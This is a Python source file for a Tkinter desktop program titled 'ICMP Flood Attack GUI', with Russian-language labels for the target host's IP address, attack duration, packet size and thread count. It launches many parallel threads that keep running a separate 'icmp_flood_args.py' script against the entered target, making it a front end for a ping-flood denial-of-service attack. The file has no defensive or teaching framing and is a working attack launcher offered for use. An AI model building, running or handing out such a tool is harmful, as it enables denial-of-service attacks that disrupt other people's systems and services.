# -*- coding: cp1251 -*-
import subprocess
import threading
import tkinter as tk
from tkinter import ttk

def send_ping(ip_dest, duration, packet_size, stop_event, process_list):
    while not stop_event.is_set():
        process = subprocess.Popen(['python', 'icmp_flood_args.py', '-target', ip_dest, '-duration', str(duration), '-size', str(packet_size)], stdout=subprocess.DEVNULL)
        process_list.append(process)
        process.wait()

def start_attack():
    global stop_event, process_list
    ip_destination = ip_entry.get()
    duration = int(duration_entry.get())
    sent_buff_size = int(size_entry.get())
    num_threads = int(threads_entry.get())

    global threads, status_label, start_button
    threads = []
    process_list = []
    stop_event = threading.Event()

    for _ in range(num_threads):
        thread = threading.Thread(target=send_ping, args=(ip_destination, duration, sent_buff_size, stop_event, process_list))
        threads.append(thread)
        thread.start()

    status_label.config(text='Running...')
    start_button.config(text='Остановить атаку', command=stop_attack, state=tk.NORMAL)

def stop_attack():
    global stop_event, process_list, status_label, start_button
    stop_event.set()
    for process in process_list:
        try:
            process.terminate()
        except ProcessLookupError:
            pass
    status_label.config(text='Attack stopped.')
    start_button.config(text='Запустить атаку', command=start_attack, state=tk.NORMAL)

def main():
    global ip_entry, duration_entry, size_entry, threads_entry, status_label, start_button

    root = tk.Tk()
    root.title("ICMP Flood Attack GUI")

    frame = ttk.Frame(root, padding="10")
    frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

    ttk.Label(frame, text="IP-адрес атакуемого хоста:").grid(column=0, row=0, sticky=tk.W)
    ip_entry = ttk.Entry(frame, width=15)
    ip_entry.grid(column=1, row=0, sticky=tk.W)

    ttk.Label(frame, text="Продолжительность атаки (с):").grid(column=0, row=1, sticky=tk.W)
    duration_entry = ttk.Entry(frame, width=15)
    duration_entry.grid(column=1, row=1, sticky=tk.W)

    ttk.Label(frame, text="Размер пакета (байт):").grid(column=0, row=2, sticky=tk.W)
    size_entry = ttk.Entry(frame, width=15)
    size_entry.grid(column=1, row=2, sticky=tk.W)

    ttk.Label(frame, text="Количество потоков:").grid(column=0, row=3, sticky=tk.W)
    threads_entry = ttk.Entry(frame, width=15)
    threads_entry.grid(column=1, row=3, sticky=tk.W)

    start_button = ttk.Button(frame, text='Запустить атаку', command=start_attack)
    start_button.grid(column=0, row=4, columnspan=2, pady=10)

    status_label = ttk.Label(frame, text='')
    status_label.grid(column=0, row=6, columnspan=2)

    root.mainloop()

if __name__ == '__main__':
    main()